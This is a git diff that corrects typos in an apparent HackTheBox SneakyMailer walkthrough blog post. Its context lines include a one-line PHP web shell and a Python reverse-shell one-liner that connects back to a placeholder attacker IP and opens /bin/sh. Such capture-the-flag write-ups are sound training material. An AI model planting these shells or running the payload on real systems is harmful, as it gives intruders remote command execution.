@@ -1,6 +1,6 @@
 ---
 layout: post
-title: HackTheBox SneakyMailer walktthrough
+title: HackTheBox SneakyMailer walkthrough
 gh-repo: c00rni/c00rni.github.io
 gh-badge: [star, fork, follow]
 tags: [enumeration, hackthebox, ssh, pypi, smtp, linux]
@@ -75,7 +75,7 @@ Created PHP script which took one parameter and executed as a command line.
 # Content of 'shell.php'
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 ```
-Uploaded `shell.php` with FTP, open a port for incoming connection and get a shell with the exploit below. Replace the Xs by your ip address.
+Uploaded `shell.php` with FTP, opened a port for incoming connection and got a shell with the exploit below. Replace the Xs by your ip address.
 
 ```plaintext
 http://dev.sneakycorp.htb/shell.php?cmd=/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("X.X.X.X",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
